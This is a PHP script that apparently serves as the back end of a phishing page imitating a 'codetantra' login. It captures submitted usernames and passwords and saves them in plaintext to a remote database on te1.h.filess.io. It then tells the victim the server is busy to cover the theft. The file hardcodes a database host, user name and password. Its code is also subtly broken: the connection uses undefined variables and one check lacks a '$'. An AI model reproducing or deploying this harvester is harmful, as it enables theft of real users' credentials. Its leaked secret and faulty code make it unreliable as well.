<?php header('Content-Type: text/html; charset=utf-8'); ?>
<?php

$Username= $_POST['Username'];  // get the username
$Password =$_POST['Password'];   //get password from form

if (!empty($Username) || !empty(Password))
{
$host = "te1.h.filess.io";
$port = 3307;
$dbname = "victimct_fuelpotsaw";
$username = "victimct_fuelpotsaw";
$password = "8b8075b376f78c1a7f2cb54bd4e6509cedcfc09e";

$conn = new mysqli ($host, $dbusername, $dbpassword, $dbname);

if (mysqli_connect_error()){
  die('Connect Error ('. mysqli_connect_errno() .') '
    . mysqli_connect_error());
}
else{
  $SELECT = "SELECT Username From codetantra Where Username = ? Limit 1";
  $INSERT = "INSERT Into codetantra (Username , Password )values(?,?)";

//Prepare statement
     $stmt = $conn->prepare($SELECT);
     $stmt->bind_param("s", $Username);
     $stmt->execute();
     $stmt->bind_result($Username);
     $stmt->store_result();
     $rnum = $stmt->num_rows;

     //checking username
      if ($rnum==0) {
      $stmt->close();
      $stmt = $conn->prepare($INSERT);
      $stmt->bind_param("ss", $Username,$Password);
      $stmt->execute();
      echo "Server Busy. Please try again later.";
     } else {
      echo "Someone already register using this email";
     }
     $stmt->close();
     $conn->close();
    }
} else {
 echo "All field are required";
 die();
}
?>